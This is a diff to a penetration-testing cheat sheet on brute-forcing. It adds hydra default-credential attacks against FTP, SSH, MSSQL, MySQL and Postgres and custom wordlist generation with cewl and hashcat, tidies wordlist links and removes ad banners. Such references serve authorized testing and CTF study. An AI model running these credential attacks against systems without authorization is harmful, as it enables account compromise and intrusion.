@@ -1,4 +1,4 @@
-# Brute Force - CheatSheet
+# Brute Force
 
 #### Fkn Check for Default Credentials
 
@@ -7,14 +7,18 @@
 ```bash
 cewl -g --with-numbers -d 20 $url |grep -v CeWL > custom-wordlist.txt
 cat users.txt >> custom-wordlist.txt
-echo "summer\nwinter\nspring\nfall\nautumn$dom" >> custom-wordlist.txt
+echo "summer\nwinter\nspring\nfall\nautumn\nsales\n$dom" >> custom-wordlist.txt
 hashcat --stdout -a 0 -r ~/repos/offsec/customizations/bdg.rule custom-wordlist.txt | awk '!a[$0]++ {print $0}' >> custom-passwords.txt
-
-hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
 ```
 
+#### Check off the box
+
 ```bash
-echo sales >> users.txt
+hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $ip ftp
+hydra -C /opt/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt $ip ssh
+hydra -C /opt/SecLists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt $ip mssql
+hydra -C /opt/SecLists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt $ip mysql
+hydra -C /opt/SecLists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt $ip postgres
 ```
 
 ```
@@ -134,24 +138,16 @@ Finished in 0.920s.
 
 ### Wordlists
 
-[https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
-[https://github.com/Dormidera/WordList-Compendium](https://github.com/Dormidera/WordList-Compendium)
-[https://github.com/kaonashi-passwords/Kaonashi](https://github.com/kaonashi-passwords/Kaonashi)
-[https://github.com/google/fuzzing/tree/master/dictionaries](https://github.com/google/fuzzing/tree/master/dictionaries)
-[https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
-[https://weakpass.com/wordlist/](https://weakpass.com/wordlist/)
-[https://wordlists.assetnote.io/](https://wordlists.assetnote.io/)
-[https://github.com/fssecur3/fuzzlists](https://github.com/fssecur3/fuzzlists)
-[https://hashkiller.io/listmanager](https://hashkiller.io/listmanager)
-[https://github.com/Karanxa/Bug-Bounty-Wordlists](https://github.com/Karanxa/Bug-Bounty-Wordlists)
-
-<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
-
-\
-Use [Trickest](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
-
-{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=brute-force" %}
+https://github.com/danielmiessler/SecLists
+https://github.com/Dormidera/WordList-Compendium
+https://github.com/kaonashi-passwords/Kaonashi
+https://github.com/google/fuzzing/tree/master/dictionaries
+https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
+https://weakpass.com/wordlist/
+https://wordlists.assetnote.io/
+https://github.com/fssecur3/fuzzlists
+https://hashkiller.io/listmanager
+https://github.com/Karanxa/Bug-Bounty-Wordlists
 
 ## Services
 
@@ -744,7 +740,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### Cisco
 
-<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
+
 
 ### DPAPI Master Key
 
@@ -775,7 +771,7 @@ zip -r file.xls .
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
 
-<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
+
 
 \
 Use [Trickest](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=brute-force) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
